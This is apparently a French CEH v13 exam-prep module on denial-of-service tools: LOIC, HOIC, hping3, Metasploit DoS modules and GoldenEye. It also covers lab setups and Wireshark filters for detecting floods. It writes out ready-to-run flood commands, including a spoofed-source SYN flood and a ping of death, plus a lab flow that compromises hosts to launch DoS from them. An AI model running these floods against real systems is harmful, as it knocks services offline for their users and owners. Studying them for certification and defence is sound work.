# 🔧 Module 10 — Outils d'Attaque & Labs CEH v13

> **CEH v13 | EC-Council**  
> `#LOIC` `#HOIC` `#Hping3` `#Metasploit` `#Wireshark` `#iLabs`

---

## 📌 Table des matières

1. [Vue d'ensemble des outils](#1-vue-densemble)
2. [LOIC — Low Orbit Ion Cannon](#2-loic)
3. [HOIC — High Orbit Ion Cannon](#3-hoic)
4. [Hping3](#4-hping3)
5. [Metasploit — Modules DoS](#5-metasploit)
6. [Autres outils notables](#6-autres-outils)
7. [Labs officiels CEH v13](#7-labs-officiels-ceh-v13)
8. [Détection avec Wireshark](#8-détection-avec-wireshark)

---

## 1. Vue d'ensemble

| Outil | Type | Attaque | OS |
|-------|------|---------|-----|
| **LOIC** | Offensif | DoS/DDoS (TCP/UDP/HTTP) | Windows/Linux |
| **HOIC** | Offensif | DDoS HTTP avancé | Windows/Linux |
| **Hping3** | Offensif/Audit | SYN Flood, ICMP Flood | Linux |
| **Metasploit** | Offensif | Modules DoS multiples | Linux |
| **ISB** | Offensif | DoS (lab CEHv13) | Windows |
| **UltraDDoS** | Offensif | DDoS (lab CEHv13) | Windows Server |
| **Anti DDoS Guardian** | Défensif | Protection DDoS | Windows |
| **Wireshark** | Analyse | Détection trafic DoS | Windows/Linux |

> ⚠️ **Avertissement légal** : Ces outils ne doivent être utilisés que dans des environnements autorisés (labs, CyberQ) ou avec permission explicite. Toute utilisation non autorisée est illégale.

---

## 2. LOIC — Low Orbit Ion Cannon

### Description

LOIC est un outil **open source** de test de charge réseau, largement utilisé dans des attaques DDoS coordonnées (notamment par Anonymous).

```
┌─────────────────────────────────────────────────┐
│                   LOIC v1.0.8                   │
├─────────────────────────────────────────────────┤
│  Target URL/IP : [___________________________]  │
│  Port          : [80_______]                   │
│  Method        : ○ TCP  ● UDP  ○ HTTP          │
│  Speed         : ████████████████░░░░ Fast     │
│  Threads       : [10____]                       │
│                                                 │
│  [ IMMA CHARGIN MAH LAZER ]  ←── Bouton Attack │
├─────────────────────────────────────────────────┤
│  Requested : 15,847  │  Connected : ✓           │
└─────────────────────────────────────────────────┘
```

### Fonctionnalités

- **TCP Flood** : Connexions TCP en masse
- **UDP Flood** : Paquets UDP en masse
- **HTTP Flood** : Requêtes HTTP GET en masse
- **Mode HIVEMIND** : Contrôle via IRC (mode DDoS distribué)

### Utilisation typique (lab)

```bash
# LOIC (Windows GUI)
1. Entrer l'IP/URL cible
2. Sélectionner le protocole (TCP/UDP/HTTP)
3. Configurer le nombre de threads
4. Cliquer "IMMA CHARGIN MAH LAZER"
```

---

## 3. HOIC — High Orbit Ion Cannon

### Description

HOIC est un successeur de LOIC, spécialisé dans les **attaques HTTP de couche 7**, capable de cibler plusieurs URLs simultanément.

```
┌──────────────────────────────────────────────────┐
│                HOIC 2.1                          │
├──────────────────────────────────────────────────┤
│  TARGETS                                         │
│  ┌──────────────────────────────────────┐        │
│  │ http://target.com  [HIGH] ✓ Enable  │        │
│  │ http://target2.com [MED]  ✓ Enable  │        │
│  └──────────────────────────────────────┘        │
│                                                  │
│  Booster : [Default.hoic     ▼]                 │
│  Threads : [███████░░░] 500                     │
│                                                  │
│  [+ADD]  [-DEL]  [▶ FIRE TEH LAZER!]           │
├──────────────────────────────────────────────────┤
│  Requests Sent : 847,293  │  Rate: 12,450/s     │
└──────────────────────────────────────────────────┘
```

### Avantages vs LOIC

| Critère | LOIC | HOIC |
|---------|------|------|
| Protocole | TCP/UDP/HTTP | HTTP uniquement |
| Targets simultanées | 1 | Multiples |
| Obfuscation | Non | Oui (Booster scripts) |
| Couche OSI | 3/4 | 7 |
| Difficulté détection | Facile | Plus difficile |

---

## 4. Hping3

### Description

Hping3 est un **outil en ligne de commande** très puissant pour l'envoi de paquets TCP/IP personnalisés. Utilisé pour l'audit réseau et les tests DoS.

### Syntaxe de base

```bash
hping3 [options] <cible>
```

### Commandes importantes pour l'examen

#### SYN Flood

```bash
# SYN Flood sur port 80 avec IP source aléatoire
hping3 -S --flood -V -p 80 --rand-source <target_ip>

# Paramètres :
# -S         : Flag SYN
# --flood    : Envoie au maximum de vitesse
# -V         : Mode verbeux
# -p 80      : Port destination 80
# --rand-source : Randomise l'IP source
```

#### UDP Flood

```bash
# UDP Flood
hping3 --udp -p 53 --flood <target_ip>
```

#### ICMP Flood

```bash
# ICMP Flood
hping3 --icmp --flood <target_ip>
```

#### Ping avec paquets surdimensionnés (Ping of Death)

```bash
# Envoi d'un paquet ICMP de 65 500 octets
hping3 --icmp -d 65500 <target_ip>
```

### Indicateurs importants

```
-S   : SYN
-A   : ACK
-R   : RST
-F   : FIN
-P   : PUSH
-U   : URG
-a   : Spoof l'IP source
-d   : Taille des données
-c   : Nombre de paquets
-i   : Intervalle (u1000 = 1ms)
```

---

## 5. Metasploit — Modules DoS

Metasploit dispose de nombreux modules DoS/auxiliaires :

```bash
# Dans msfconsole :
use auxiliary/dos/tcp/synflood        # SYN Flood
use auxiliary/dos/http/slowloris      # Slowloris
use auxiliary/dos/windows/smb/ms09_001_write  # SMB DoS
```

### Exemple SYN Flood via Metasploit

```bash
msf6 > use auxiliary/dos/tcp/synflood
msf6 auxiliary(dos/tcp/synflood) > set RHOST 10.10.1.19
msf6 auxiliary(dos/tcp/synflood) > set RPORT 80
msf6 auxiliary(dos/tcp/synflood) > run

[*] SYN flooding 10.10.1.19:80...
```

### Utilisation d'un script Python (eagle-dos.py)

Dans les labs CEHv13, après compromission via Metasploit :

```bash
# Sur la machine compromise
python3 eagle-dos.py --target 10.10.1.9 --port 80 --threads 100
```

---

## 6. Autres outils notables

### RUDY (R-U-Dead-Yet)

```
Type : Application Layer DoS (similaire à Slowloris)
Mécanisme : HTTP POST avec Content-Length élevé
            Envoie les données octet par octet très lentement
Cible : Serveurs avec timeout de connexion long
```

### T50 (Suterusu)

```bash
# Multi-protocol flooder
t50 <target_ip> --flood --turbo --protocol TCP
```

### PyLoris

```python
# Python-based Slowloris attack
pyloris --target target.com --port 443 --ssl --threads 500
```

### GoldenEye

```bash
# HTTP DoS tool written in Python
./goldeneye.py http://target.com -w 500 -s 500 -m GET
```

---

## 7. Labs Officiels CEH v13

Les labs officiels du Module 10 sur la plateforme **CyberQ/iLabs** :

### Lab 10.1 — DoS avec ISB et UltraDDoS

```
Environnement :
  - Windows 11 (Attaquant 1) : Outil ISB
  - Windows Server 2022 (Attaquant 2) : Outil UltraDDoS
  - Windows Server 2019 (Cible) : 10.10.1.19

Objectif : Identifier le port attaqué
Chemin ISB : E:\CEH-Tools\CEHv13 Module 10\DoS and DDoS Attack Tools\ISB
Chemin UltraDDoS : Z:\CEHv13 Module 10\DoS and DDoS Attack Tools\UltraDDoS
```

### Lab 10.2 — DDoS avec LOIC

```
Environnement :
  - Windows Server 2019 (Attaquant 1) : LOIC
  - Windows Server 2022 (Attaquant 2) : LOIC
  - Windows 11 (Cible)

Objectif : Lancer une attaque DDoS coordonnée
Outil défensif : Anti DDoS Guardian sur Windows 11
```

### Lab 10.3 — DoS via Metasploit + eagle-dos.py

```
Environnement :
  - Parrot Security (Attaquant) : Metasploit
  - Windows 11, Win Server 2022, Win Server 2019 (Compromis)
  - Ubuntu (Cible) : 10.10.1.9

Étapes :
  1. Compromettre les machines Windows avec Metasploit
  2. Déployer eagle-dos.py sur les machines compromises
  3. Lancer l'attaque DoS sur Ubuntu
  4. Capturer le trafic avec Wireshark sur Ubuntu
  5. Identifier l'interface réseau utilisée pour la capture
```

---

## 8. Détection avec Wireshark

### Filtres Wireshark pour détecter les attaques DoS

```
# Détecter un SYN Flood
tcp.flags.syn==1 && tcp.flags.ack==0

# Détecter un UDP Flood
udp

# Détecter un ICMP Flood
icmp

# Détecter Slowloris (nombreuses connexions TCP semi-ouvertes)
tcp.flags.syn==1

# Filtrer par IP source suspecte
ip.src == 192.168.1.100

# Détecter des paquets fragmentés anormaux
ip.frag_offset > 0
```

### Signes d'une attaque DoS dans Wireshark

```
🔴 Indicateurs visuels :
  - Pic soudain dans le graphe I/O
  - Une seule IP source avec des milliers de paquets/s
  - Nombreux SYN sans ACK correspondant
  - Paquets malformés ou fragmentés en masse
  - Timeouts et retransmissions TCP excessifs
```

---

## 🧠 Points clés à retenir pour l'examen

> 📝 **À mémoriser absolument :**

- **LOIC** : Low Orbit Ion Cannon — TCP/UDP/HTTP — Mode HIVEMIND via IRC
- **HOIC** : High Orbit Ion Cannon — HTTP uniquement — multiples cibles + boosters
- **Hping3** : `-S` pour SYN, `--flood` pour le mode flood, `--rand-source` pour spoofing
- **Slowloris** : maintient des connexions HTTP **partielles** ouvertes indéfiniment
- Dans les labs CEHv13, Wireshark est utilisé sur la **machine victime** pour capturer le trafic
- **Anti DDoS Guardian** = outil de protection DDoS pour Windows

---

*⬅️ [Techniques Avancées](./03_techniques_avancees.md) | ➡️ [Contre-mesures](./05_contre-mesures.md)*
